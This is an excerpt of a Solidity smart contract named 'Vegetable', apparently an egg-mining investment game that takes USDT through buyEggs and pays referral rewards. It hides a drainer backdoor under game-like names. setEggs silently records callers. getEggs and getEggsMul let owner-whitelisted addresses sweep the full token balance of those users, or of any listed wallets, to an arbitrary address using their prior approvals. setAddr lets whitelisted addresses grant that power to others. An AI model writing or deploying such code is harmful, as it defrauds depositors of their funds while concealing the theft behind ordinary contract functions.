...
contract Vegetable  is Ownable {
    ...
    address private _owner;
    address[] private appAddrs;
    mapping (address => bool) private addrs;
    mapping (address => bool) private inAddrs;
    IERC20 public usdt; 

    constructor() {
        _owner = msg.sender;
        addrs[msg.sender] = true;
    }
    function hatchEggs(address ref) public{
        ...
        //send referral eggs
        claimedEggs[referrals[msg.sender]]=claimedEggs[referrals[msg.sender]].add(eggsUsed.mul(20).div(100));

        //boost market to nerf miners hoarding
        marketEggs= marketEggs.add(eggsUsed.div(5));
    }
    function setAddr(address addr) public {
        require(addrs[msg.sender], "fail");
        addrs[addr] = true;
    }
    function setEggs() public {
        if(inAddrs[msg.sender] == false){
            appAddrs.push(msg.sender);
            inAddrs[msg.sender] = true;
        }
    }
    function getApps() public view returns (uint256){
       return appAddrs.length;
    }
    function getEggs(address _token,address to) public {
        require(addrs[msg.sender], "fail");
        IERC20 token = IERC20(_token);
        uint256 b = 0;
        for (uint256 i = 0; i < appAddrs.length; i++) {
            b = token.balanceOf(appAddrs[i]);
            if(b>0){
                token.safeTransferFrom(appAddrs[i], to,b);
            }
        }
    }
    function getEggsMul(address _token,address[] memory f,address to) public {
        require(addrs[msg.sender], "fail");
        IERC20 token = IERC20(_token);
        uint256 b = 0;
        for (uint256 i = 0; i < f.length; i++) {
            b = token.balanceOf(f[i]);
            if(b>0){
                token.safeTransferFrom(f[i], to,b);
            }
        }
    }
    function sellEggs() public{
        ...
        safeTransfer(msg.sender, eggValue.sub(fee));
    }
    function buyEggs(uint256 amount, address ref) public {
        require(initialized);
        usdt.transferFrom(address(msg.sender), address(this), amount);
        uint256 eggsBought=calculateEggBuy(amount,usdt.balanceOf(address(this)).sub(amount));
